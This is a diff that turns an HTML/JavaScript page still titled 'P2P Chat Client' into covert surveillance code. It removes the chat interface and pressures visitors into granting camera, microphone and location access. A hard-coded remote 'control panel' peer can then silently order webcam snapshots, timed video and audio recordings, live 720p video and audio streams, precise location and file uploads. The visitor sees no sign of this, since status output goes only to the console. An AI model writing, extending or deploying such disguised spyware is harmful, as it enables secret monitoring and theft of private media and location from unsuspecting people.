@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>P2P Chat Client</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <script src="https://unpkg.com/@ffmpeg/ffmpeg@0.11.6/dist/ffmpeg.min.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -15,83 +16,15 @@
             margin: 0;
             background-color: #f0f2f5;
         }
-        .chat-container {
-            width: 400px;
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-            max-height: 600px;
-        }
-        .chat-header {
-            background: #007bff;
-            color: white;
-            padding: 10px;
-            text-align: center;
-            font-size: 1.2em;
-        }
-        #status {
-            padding: 10px;
-            text-align: center;
-            font-size: 0.9em;
-            color: #555;
-        }
-        .chat-window {
-            flex: 1;
-            padding: 10px;
-            overflow-y: auto;
-            border-bottom: 1px solid #ddd;
-        }
-        .message {
-            margin: 5px 0;
-            padding: 8px 12px;
-            border-radius: 15px;
-            max-width: 70%;
-            word-wrap: break-word;
-        }
-        .sent {
-            background: #007bff;
-            color: white;
-            margin-left: auto;
-            border-bottom-right-radius: 5px;
-        }
-        .received {
-            background: #e9ecef;
-            margin-right: auto;
-            border-bottom-left-radius: 5px;
-        }
-        .image-message {
-            max-width: 100%;
-            margin: 5px 0;
-            border-radius: 5px;
-        }
-        .chat-input {
-            display: flex;
-            padding: 10px;
-            background: #f8f9fa;
-        }
-        input[type="text"] {
-            flex: 1;
-            padding: 8px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-        input:focus {
-            border-color: #007bff;
-        }
         button {
-            padding: 8px 15px;
-            margin-left: 10px;
+            padding: 10px 20px;
             background: #007bff;
             color: white;
             border: none;
             border-radius: 5px;
             cursor: pointer;
             transition: background 0.2s;
+            font-size: 1em;
         }
         button:hover {
             background: #0056b3;
@@ -100,61 +33,173 @@
             background: #6c757d;
             cursor: not-allowed;
         }
-        #status-area {
-            font-size: 0.8em;
-            color: #666;
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            max-width: 400px;
             text-align: center;
-            padding: 5px;
+        }
+        .modal-content p {
+            margin: 0 0 20px;
+            color: #333;
+        }
+        .modal-content button {
+            margin: 5px;
+        }
+        .error {
+            color: #dc3545;
+            margin: 10px 0;
         }
     </style>
 </head>
 <body>
-    <div class="chat-container">
-        <div class="chat-header">P2P Chat Client</div>
-        <div id="status">Initializing...</div>
-        <div id="status-area"></div>
-        <div class="chat-window" id="chat-window"></div>
-        <div class="chat-input">
-            <button onclick="connectToControlPanel()" id="connect-btn">Connect</button>
-        </div>
-        <div class="chat-input">
-            <input type="text" id="message-input" placeholder="Type a message" disabled>
-            <button onclick="sendMessage()" disabled id="send-btn">Send</button>
+    <button onclick="connectToControlPanel()" id="connect-btn" disabled>Connect</button>
+    <div class="modal" id="permission-modal">
+        <div class="modal-content">
+            <p>This app requires camera, microphone, and location permissions to function.</p>
+            <div id="permission-error" class="error"></div>
+            <button onclick="requestPermissions()" id="grant-btn">Grant Permissions</button>
+            <button onclick="retryPermissions()" id="retry-btn" style="display: none;">Retry</button>
         </div>
     </div>
 
     <script>
         let peer = null;
         let conn = null;
-        const status = document.getElementById('status');
-        const statusArea = document.getElementById('status-area');
-        const chatWindow = document.getElementById('chat-window');
-        const messageInput = document.getElementById('message-input');
-        const sendBtn = document.getElementById('send-btn');
+        let currentStream = null;
         const connectBtn = document.getElementById('connect-btn');
+        const permissionModal = document.getElementById('permission-modal');
+        const permissionError = document.getElementById('permission-error');
+        const grantBtn = document.getElementById('grant-btn');
+        const retryBtn = document.getElementById('retry-btn');
+        let mediaStream = null;
+        let permissionsGranted = { camera: false, microphone: false, location: false };
+
+        // Initialize FFmpeg (kept for potential future use)
+        const { createFFmpeg, fetchFile } = FFmpeg;
+        const ffmpeg = createFFmpeg({ log: true });
+        let ffmpegLoaded = false;
+        async function loadFFmpeg() {
+            if (!ffmpegLoaded) {
+                console.log('Loading FFmpeg...');
+                try {
+                    await ffmpeg.load();
+                    ffmpegLoaded = true;
+                    console.log('FFmpeg loaded successfully');
+                } catch (err) {
+                    console.error('FFmpeg load error:', err);
+                    throw new Error('Failed to load FFmpeg');
+                }
+            }
+        }
+
+        // Show permission popup on load
+        window.onload = () => {
+            permissionModal.style.display = 'flex';
+            connectBtn.disabled = true;
+        };
+
+        // Request camera and microphone permissions
+        async function requestMediaPermissions() {
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                permissionsGranted.camera = true;
+                permissionsGranted.microphone = true;
+                console.log('Camera and microphone permissions granted');
+                return true;
+            } catch (err) {
+                console.error('Media permission error:', err);
+                permissionError.textContent = `Failed to access camera/microphone: ${err.message}`;
+                permissionsGranted.camera = false;
+                permissionsGranted.microphone = false;
+                return false;
+            }
+        }
+
+        // Request location permission
+        async function requestLocationPermission() {
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    () => {
+                        permissionsGranted.location = true;
+                        console.log('Location permission granted');
+                        resolve(true);
+                    },
+                    (err) => {
+                        console.error('Location permission error:', err);
+                        permissionError.textContent = `Failed to access location: ${err.message}`;
+                        permissionsGranted.location = false;
+                        resolve(false);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
+        }
+
+        // Request all permissions
+        async function requestPermissions() {
+            permissionError.textContent = '';
+            grantBtn.disabled = true;
+            const mediaSuccess = await requestMediaPermissions();
+            const locationSuccess = await requestLocationPermission();
+
+            if (mediaSuccess && locationSuccess) {
+                permissionModal.style.display = 'none';
+                connectBtn.disabled = false;
+            } else {
+                retryBtn.style.display = 'inline-block';
+                grantBtn.style.display = 'none';
+                permissionError.textContent = permissionError.textContent || 'Some permissions were denied.';
+            }
+            grantBtn.disabled = false;
+        }
+
+        // Retry permissions
+        function retryPermissions() {
+            permissionError.textContent = '';
+            retryBtn.style.display = 'none';
+            grantBtn.style.display = 'inline-block';
+            requestPermissions();
+        }
 
         // Initialize PeerJS
         peer = new Peer();
         peer.on('open', (id) => {
-            status.textContent = `Your Peer ID: ${id}`;
+            console.log(`Your Peer ID: ${id}`);
         });
 
         // Connect to control panel
         function connectToControlPanel() {
+            if (!permissionsGranted.camera || !permissionsGranted.microphone || !permissionsGranted.location) {
+                console.log('Warning: Some permissions denied');
+            }
             conn = peer.connect('12345');
             connectBtn.disabled = true;
-            status.textContent = 'Connecting...';
+            console.log('Connecting to control panel...');
 
             conn.on('open', () => {
-                status.textContent = 'Connected to Control Panel';
-                messageInput.disabled = false;
-                sendBtn.disabled = false;
+                console.log('Connected to Control Panel');
+                // loadFFmpeg(); // Not needed for WebM
             });
 
             conn.on('data', (data) => {
                 console.log('Received data:', data);
                 if (data.type === 'message') {
-                    addMessage(data.content, 'received');
+                    console.log('Message:', data.content);
                 } else if (data.type === 'request-image') {
                     captureAndSendImage();
                 } else if (data.type === 'request-location') {
@@ -162,29 +207,125 @@
                 } else if (data.type === 'request-file') {
                     captureAndSendFile();
                 } else if (data.type === 'request-video') {
-                    captureAndSendVideo();
+                    captureAndSendVideo(data.duration);
                 } else if (data.type === 'request-audio') {
-                    captureAndSendAudio();
+                    captureAndSendAudio(data.duration);
+                } else if (data.type === 'request-live-video') {
+                    startLiveVideo();
+                } else if (data.type === 'request-live-audio') {
+                    startLiveAudio();
                 }
             });
 
             conn.on('close', () => {
-                status.textContent = 'Disconnected';
-                messageInput.disabled = true;
-                sendBtn.disabled = true;
+                console.log('Disconnected');
                 connectBtn.disabled = false;
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(track => track.stop());
+                    mediaStream = null;
+                }
+                if (currentStream) {
+                    currentStream.getTracks().forEach(track => track.stop());
+                    currentStream = null;
+                }
                 conn = null;
             });
 
             conn.on('error', (err) => {
                 console.error('Connection error:', err);
-                statusArea.textContent = `Connection error: ${err.message}`;
-                setTimeout(() => { statusArea.textContent = ''; }, 5000);
+                alert(`Connection error: ${err.message}`);
+                connectBtn.disabled = false;
             });
         }
 
+        async function startLiveVideo() {
+            if (!permissionsGranted.camera || !permissionsGranted.microphone) {
+                if (conn && conn.open) {
+                    conn.send({ type: 'message', content: 'Camera or microphone permission denied' });
+                }
+                console.error('Camera or microphone permission denied');
+                return;
+            }
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: 1280, height: 720 }, // 720p
+                    audio: true 
+                });
+                console.log('Live video stream acquired:', stream);
+                currentStream = stream;
+                const call = peer.call('12345', stream);
+                call.on('close', () => {
+                    console.log('Live video call closed');
+                    if (currentStream) {
+                        currentStream.getTracks().forEach(track => track.stop());
+                        currentStream = null;
+                    }
+                });
+                call.on('error', (err) => {
+                    console.error('Live video call error:', err);
+                    if (conn && conn.open) {
+                        conn.send({ type: 'message', content: `Live video error: ${err.message}` });
+                    }
+                    if (currentStream) {
+                        currentStream.getTracks().forEach(track => track.stop());
+                        currentStream = null;
+                    }
+                });
+            } catch (err) {
+                console.error('Error accessing camera/microphone:', err);
+                if (conn && conn.open) {
+                    conn.send({ type: 'message', content: `Failed to access camera/microphone: ${err.message}` });
+                }
+            }
+        }
+
+        async function startLiveAudio() {
+            if (!permissionsGranted.microphone) {
+                if (conn && conn.open) {
+                    conn.send({ type: 'message', content: 'Microphone permission denied' });
+                }
+                console.error('Microphone permission denied');
+                return;
+            }
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                console.log('Live audio stream acquired:', stream);
+                currentStream = stream;
+                const call = peer.call('12345', stream);
+                call.on('close', () => {
+                    console.log('Live audio call closed');
+                    if (currentStream) {
+                        currentStream.getTracks().forEach(track => track.stop());
+                        currentStream = null;
+                    }
+                });
+                call.on('error', (err) => {
+                    console.error('Live audio call error:', err);
+                    if (conn && conn.open) {
+                        conn.send({ type: 'message', content: `Live audio error: ${err.message}` });
+                    }
+                    if (currentStream) {
+                        currentStream.getTracks().forEach(track => track.stop());
+                        currentStream = null;
+                    }
+                });
+            } catch (err) {
+                console.error('Error accessing microphone:', err);
+                if (conn && conn.open) {
+                    conn.send({ type: 'message', content: `Failed to access microphone: ${err.message}` });
+                }
+            }
+        }
+
         function captureAndSendImage() {
-            statusArea.textContent = "Capturing image...";
+            if (!permissionsGranted.camera) {
+                if (conn && conn.open) {
+                    conn.send({ type: 'message', content: 'Camera permission denied' });
+                }
+                console.error('Camera permission denied');
+                return;
+            }
+            console.log('Capturing image...');
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
                     const video = document.createElement('video');
@@ -204,27 +345,30 @@
                             
                             if (conn && conn.open) {
                                 conn.send({ type: 'image', content: imageData });
-                                statusArea.textContent = "Image captured and sent";
-                                setTimeout(() => { statusArea.textContent = ''; }, 3000);
+                                console.log('Image captured and sent');
                             } else {
-                                statusArea.textContent = "Connection lost";
-                                setTimeout(() => { statusArea.textContent = ''; }, 5000);
+                                console.error('Connection lost');
                             }
                         }, 500);
                     };
                 })
                 .catch(err => {
-                    console.error("Error accessing camera:", err);
-                    statusArea.textContent = `Camera error: ${err.message}`;
+                    console.error('Error accessing camera:', err);
                     if (conn && conn.open) {
                         conn.send({ type: 'message', content: `Failed to access camera: ${err.message}` });
                     }
-                    setTimeout(() => { statusArea.textContent = ''; }, 5000);
                 });
         }
 
         function captureAndSendLocation() {
-            statusArea.textContent = "Fetching location...";
+            if (!permissionsGranted.location) {
+                if (conn && conn.open) {
+                    conn.send({ type: 'message', content: 'Location permission denied' });
+                }
+                console.error('Location permission denied');
+                return;
+            }
+            console.log('Fetching location...');
             navigator.geolocation.getCurrentPosition(
                 (position) => {
                     const location = {
@@ -233,27 +377,23 @@
                     };
                     if (conn && conn.open) {
                         conn.send({ type: 'location', content: location });
-                        statusArea.textContent = "Location sent";
-                        setTimeout(() => { statusArea.textContent = ''; }, 3000);
+                        console.log('Location sent');
                     } else {
-                        statusArea.textContent = "Connection lost";
-                        setTimeout(() => { statusArea.textContent = ''; }, 5000);
+                        console.error('Connection lost');
                     }
                 },
                 (err) => {
-                    console.error("Error accessing location:", err);
-                    statusArea.textContent = `Location error: ${err.message}`;
+                    console.error('Error accessing location:', err);
                     if (conn && conn.open) {
                         conn.send({ type: 'message', content: `Failed to access location: ${err.message}` });
                     }
-                    setTimeout(() => { statusArea.textContent = ''; }, 5000);
                 },
                 { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
         }
 
         function captureAndSendFile() {
-            statusArea.textContent = "Select a file...";
+            console.log('Selecting file...');
             const input = document.createElement('input');
             input.type = 'file';
             input.accept = '*/*';
@@ -265,25 +405,23 @@
                 document.body.removeChild(input);
 
                 if (!file) {
-                    statusArea.textContent = "No file selected";
-                    setTimeout(() => { statusArea.textContent = ''; }, 3000);
                     if (conn && conn.open) {
                         conn.send({ type: 'message', content: 'No file selected' });
                     }
+                    console.error('No file selected');
                     return;
                 }
 
-                const maxSize = 10 * 1024 * 1024;
+                const maxSize = 50 * 1024 * 1024; // 50MB
                 if (file.size > maxSize) {
-                    statusArea.textContent = "File too large (max 10MB)";
                     if (conn && conn.open) {
-                        conn.send({ type: 'message', content: 'File too large (max 10MB)' });
+                        conn.send({ type: 'message', content: 'File too large (max 50MB)' });
                     }
-                    setTimeout(() => { statusArea.textContent = ''; }, 5000);
+                    console.error('File too large (max 50MB)');
                     return;
                 }
 
-                statusArea.textContent = `Reading file: ${file.name}`;
+                console.log(`Reading file: ${file.name}`);
                 const reader = new FileReader();
                 reader.onload = (e) => {
                     const dataUrl = e.target.result;
@@ -292,181 +430,245 @@
                             type: 'file', 
                             content: { dataUrl: dataUrl, fileName: file.name } 
                         });
-                        statusArea.textContent = `File ${file.name} sent`;
-                        setTimeout(() => { statusArea.textContent = ''; }, 3000);
+                        console.log(`File ${file.name} sent`);
                     } else {
-                        statusArea.textContent = "Connection lost";
-                        setTimeout(() => { statusArea.textContent = ''; }, 5000);
+                        console.error('Connection lost');
                     }
                 };
                 reader.onerror = () => {
-                    statusArea.textContent = `Error reading file: ${file.name}`;
                     if (conn && conn.open) {
                         conn.send({ type: 'message', content: `Error reading file: ${file.name}` });
                     }
-                    setTimeout(() => { statusArea.textContent = ''; }, 5000);
+                    console.error(`Error reading file: ${file.name}`);
                 };
                 reader.readAsDataURL(file);
             };
             input.onerror = () => {
                 document.body.removeChild(input);
-                statusArea.textContent = "Error opening file picker";
-                setTimeout(() => { statusArea.textContent = ''; }, 5000);
+                console.error('Error opening file picker');
             };
             input.click();
         }
 
-        function captureAndSendVideo() {
-            statusArea.textContent = "Starting video recording...";
-            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-                .then(stream => {
-                    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                    const chunks = [];
-                    recorder.ondataavailable = (e) => chunks.push(e.data);
-                    recorder.onstop = () => {
-                        stream.getTracks().forEach(track => track.stop());
-                        const blob = new Blob(chunks, { type: 'video/webm' });
-                        const maxSize = 10 * 1024 * 1024;
-                        if (blob.size > maxSize) {
-                            statusArea.textContent = "Video too large (max 10MB)";
-                            if (conn && conn.open) {
-                                conn.send({ type: 'message', content: 'Video too large (max 10MB)' });
-                            }
-                            setTimeout(() => { statusArea.textContent = ''; }, 5000);
-                            return;
-                        }
-                        const reader = new FileReader();
-                        reader.onload = () => {
-                            const dataUrl = reader.result;
-                            if (conn && conn.open) {
-                                conn.send({ 
-                                    type: 'video', 
-                                    content: { 
-                                        dataUrl: dataUrl, 
-                                        fileName: `video_${Date.now()}.webm` 
-                                    } 
-                                });
-                                statusArea.textContent = "Video recorded and sent";
-                                setTimeout(() => { statusArea.textContent = ''; }, 3000);
-                            } else {
-                                statusArea.textContent = "Connection lost";
-                                setTimeout(() => { statusArea.textContent = ''; }, 5000);
-                            }
-                        };
-                        reader.onerror = () => {
-                            statusArea.textContent = "Error reading video";
-                            if (conn && conn.open) {
-                                conn.send({ type: 'message', content: 'Error reading video' });
-                            }
-                            setTimeout(() => { statusArea.textContent = ''; }, 5000);
-                        };
-                        reader.readAsDataURL(blob);
-                    };
-                    recorder.start();
-                    setTimeout(() => {
-                        if (recorder.state === 'recording') {
-                            recorder.stop();
-                        }
-                    }, 10000); // 10 seconds
-                })
-                .catch(err => {
-                    console.error("Error accessing camera/microphone:", err);
-                    statusArea.textContent = `Media error: ${err.message}`;
-                    if (conn && conn.open) {
-                        conn.send({ type: 'message', content: `Failed to access camera/microphone: ${err.message}` });
-                    }
-                    setTimeout(() => { statusArea.textContent = ''; }, 5000);
+        async function captureAndSendVideo(duration) {
+            if (!permissionsGranted.camera || !permissionsGranted.microphone) {
+                if (conn && conn.open) {
+                    conn.send({ type: 'message', content: 'Camera or microphone permission denied' });
+                }
+                console.error('Camera or microphone permission denied');
+                return;
+            }
+            let recordTime = (typeof duration === 'number' && duration >= 1 && duration <= 60) ? duration * 1000 : 10000;
+            console.log(`Starting video recording for ${recordTime/1000}s...`);
+            try {
+                const stream = mediaStream || await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: 1280, height: 720 }, // 720p
+                    audio: true 
                 });
+                console.log('Video stream acquired:', stream);
+                const audioTracks = stream.getAudioTracks();
+                const videoTracks = stream.getVideoTracks();
+                console.log('Video track state:', {
+                    label: videoTracks[0]?.label,
+                    readyState: videoTracks[0]?.readyState,
+                    enabled: videoTracks[0]?.enabled
+                });
+                console.log('Audio track state:', {
+                    label: audioTracks[0]?.label,
+                    readyState: audioTracks[0]?.readyState,
+                    enabled: audioTracks[0]?.enabled
+                });
+
+                const mimeType = 'video/webm;codecs=vp8,opus';
+                if (!MediaRecorder.isTypeSupported(mimeType)) {
+                    throw new Error(`MIME type ${mimeType} not supported`);
+                }
+                const recorder = new MediaRecorder(stream, { 
+                    mimeType,
+                    videoBitsPerSecond: 5000000, // 5Mbps
+                    audioBitsPerSecond: 192000 // 192kbps
+                });
+                const chunks = [];
+                recorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) {
+                        chunks.push(e.data);
+                        console.log('Video chunk received:', e.data.size);
+                    }
+                };
+                recorder.onstart = () => console.log('Video recording started');
+                recorder.onstop = async () => {
+                    console.log('Video recording stopped');
+                    if (!mediaStream) {
+                        stream.getTracks().forEach(track => track.stop());
+                    }
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const maxSize = 50 * 1024 * 1024; // 50MB
+                    console.log('Video blob size:', blob.size);
+                    if (blob.size > maxSize) {
+                        if (conn && conn.open) {
+                            conn.send({ type: 'message', content: 'Video too large (max 50MB)' });
+                        }
+                        console.error('Video too large (max 50MB)');
+                        return;
+                    }
+
+                    const fileName = `video_${Date.now()}.webm`;
+                    const reader = new FileReader();
+                    reader.onload = () => {
+                        const dataUrl = reader.result;
+                        if (conn && conn.open) {
+                            conn.send({ 
+                                type: 'video', 
+                                content: { dataUrl: dataUrl, fileName: fileName } 
+                            });
+                            console.log('Video recorded and sent as WebM');
+                        } else {
+                            console.error('Connection lost');
+                        }
+                    };
+                    reader.onerror = () => {
+                        if (conn && conn.open) {
+                            conn.send({ type: 'message', content: 'Error reading video' });
+                        }
+                        console.error('Error reading video');
+                    };
+                    reader.readAsDataURL(blob);
+                };
+                recorder.onerror = (event) => {
+                    console.error('MediaRecorder error:', event.error);
+                    if (conn && conn.open) {
+                        conn.send({ type: 'message', content: `Recording error: ${event.error.message}` });
+                    }
+                };
+                recorder.start();
+                console.log('MediaRecorder state:', recorder.state);
+                setTimeout(() => {
+                    if (recorder.state === 'recording') {
+                        recorder.stop();
+                        console.log('Stopping video recording');
+                    }
+                }, recordTime);
+            } catch (err) {
+                console.error('Error accessing camera/microphone:', err);
+                if (conn && conn.open) {
+                    conn.send({ type: 'message', content: `Failed to access camera/microphone: ${err.message}` });
+                }
+            }
         }
 
-        function captureAndSendAudio() {
-            statusArea.textContent = "Starting audio recording...";
-            navigator.mediaDevices.getUserMedia({ audio: true })
-                .then(stream => {
-                    const recorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
-                    const chunks = [];
-                    recorder.ondataavailable = (e) => chunks.push(e.data);
-                    recorder.onstop = () => {
-                        stream.getTracks().forEach(track => track.stop());
-                        const blob = new Blob(chunks, { type: 'audio/webm' });
-                        const maxSize = 10 * 1024 * 1024;
-                        if (blob.size > maxSize) {
-                            statusArea.textContent = "Audio too large (max 10MB)";
-                            if (conn && conn.open) {
-                                conn.send({ type: 'message', content: 'Audio too large (max 10MB)' });
-                            }
-                            setTimeout(() => { statusArea.textContent = ''; }, 5000);
-                            return;
-                        }
-                        const reader = new FileReader();
-                        reader.onload = () => {
-                            const dataUrl = reader.result;
-                            if (conn && conn.open) {
-                                conn.send({ 
-                                    type: 'audio', 
-                                    content: { 
-                                        dataUrl: dataUrl, 
-                                        fileName: `audio_${Date.now()}.webm` 
-                                    } 
-                                });
-                                statusArea.textContent = "Audio recorded and sent";
-                                setTimeout(() => { statusArea.textContent = ''; }, 3000);
-                            } else {
-                                statusArea.textContent = "Connection lost";
-                                setTimeout(() => { statusArea.textContent = ''; }, 5000);
-                            }
-                        };
-                        reader.onerror = () => {
-                            statusArea.textContent = "Error reading audio";
-                            if (conn && conn.open) {
-                                conn.send({ type: 'message', content: 'Error reading audio' });
-                            }
-                            setTimeout(() => { statusArea.textContent = ''; }, 5000);
-                        };
-                        reader.readAsDataURL(blob);
-                    };
-                    recorder.start();
-                    setTimeout(() => {
-                        if (recorder.state === 'recording') {
-                            recorder.stop();
-                        }
-                    }, 10000); // 10 seconds
-                })
-                .catch(err => {
-                    console.error("Error accessing microphone:", err);
-                    statusArea.textContent = `Microphone error: ${err.message}`;
-                    if (conn && conn.open) {
-                        conn.send({ type: 'message', content: `Failed to access microphone: ${err.message}` });
-                    }
-                    setTimeout(() => { statusArea.textContent = ''; }, 5000);
+        async function captureAndSendAudio(duration) {
+            if (!permissionsGranted.microphone) {
+                if (conn && conn.open) {
+                    conn.send({ type: 'message', content: 'Microphone permission denied' });
+                }
+                console.error('Microphone permission denied');
+                return;
+            }
+            let recordTime = (typeof duration === 'number' && duration >= 1 && duration <= 60) ? duration * 1000 : 10000;
+            console.log(`Starting audio recording for ${recordTime/1000}s...`);
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                console.log('Audio stream acquired:', stream);
+                const audioTracks = stream.getAudioTracks();
+                if (audioTracks.length === 0) {
+                    throw new Error('No audio tracks available in stream');
+                }
+                console.log('Audio track state:', {
+                    label: audioTracks[0].label,
+                    readyState: audioTracks[0].readyState,
+                    enabled: audioTracks[0].enabled
                 });
+
+                let mimeType = 'audio/webm;codecs=opus';
+                if (!MediaRecorder.isTypeSupported(mimeType)) {
+                    console.warn(`MIME type ${mimeType} not supported, falling back to audio/webm`);
+                    mimeType = 'audio/webm';
+                    if (!MediaRecorder.isTypeSupported(mimeType)) {
+                        throw new Error('No supported audio MIME type found');
+                    }
+                }
+                console.log('Selected MIME type:', mimeType);
+
+                const recorder = new MediaRecorder(stream, { 
+                    mimeType,
+                    audioBitsPerSecond: 192000 // 192kbps
+                });
+                const chunks = [];
+                recorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) {
+                        chunks.push(e.data);
+                        console.log('Audio chunk received:', e.data.size);
+                    }
+                };
+                recorder.onstart = () => console.log('Audio recording started');
+                recorder.onstop = async () => {
+                    console.log('Audio recording stopped');
+                    stream.getTracks().forEach(track => track.stop());
+                    const blob = new Blob(chunks, { type: 'audio/webm' });
+                    const maxSize = 50 * 1024 * 1024; // 50MB
+                    console.log('Audio blob size:', blob.size);
+                    if (blob.size > maxSize) {
+                        if (conn && conn.open) {
+                            conn.send({ type: 'message', content: 'Audio too large (max 50MB)' });
+                        }
+                        console.error('Audio too large (max 50MB)');
+                        return;
+                    }
+
+                    const fileName = `audio_${Date.now()}.webm`;
+                    const reader = new FileReader();
+                    reader.onload = () => {
+                        const dataUrl = reader.result;
+                        if (conn && conn.open) {
+                            conn.send({ 
+                                type: 'audio', 
+                                content: { dataUrl: dataUrl, fileName: fileName } 
+                            });
+                            console.log('Audio recorded and sent as WebM');
+                        } else {
+                            console.error('Connection lost');
+                        }
+                    };
+                    reader.onerror = () => {
+                        if (conn && conn.open) {
+                            conn.send({ type: 'message', content: 'Error reading audio' });
+                        }
+                        console.error('Error reading audio');
+                    };
+                    reader.readAsDataURL(blob);
+                };
+                recorder.onerror = (event) => {
+                    console.error('MediaRecorder error:', event.error);
+                    if (conn && conn.open) {
+                        conn.send({ type: 'message', content: `Recording error: ${event.error.message}` });
+                    }
+                };
+                recorder.start();
+                console.log('MediaRecorder state:', recorder.state);
+                setTimeout(() => {
+                    if (recorder.state === 'recording') {
+                        recorder.stop();
+                        console.log('Stopping audio recording');
+                    }
+                }, recordTime);
+            } catch (err) {
+                console.error('Error accessing microphone:', err);
+                if (conn && conn.open) {
+                    conn.send({ type: 'message', content: `Failed to access microphone: ${err.message}` });
+                }
+            }
         }
 
-        function sendMessage() {
-            const message = messageInput.value.trim();
-            if (!message || !conn || !conn.open) return;
+        function sendMessage(message) {
+            if (!conn || !conn.open) return;
             conn.send({ type: 'message', content: message });
-            addMessage(message, 'sent');
-            messageInput.value = '';
-        }
-
-        function addMessage(message, type) {
-            const div = document.createElement('div');
-            div.className = `message ${type}`;
-            div.textContent = message;
-            chatWindow.appendChild(div);
-            chatWindow.scrollTop = chatWindow.scrollHeight;
+            console.log('Message sent:', message);
         }
 
         peer.on('error', (err) => {
             console.error('Peer error:', err);
-            status.textContent = `Error: ${err.type}`;
-            alert(`Error: ${err.type}`);
+            alert(`Peer error: ${err.type}`);
             connectBtn.disabled = false;
-        });
-
-        messageInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') sendMessage();
         });
     </script>
 </body>
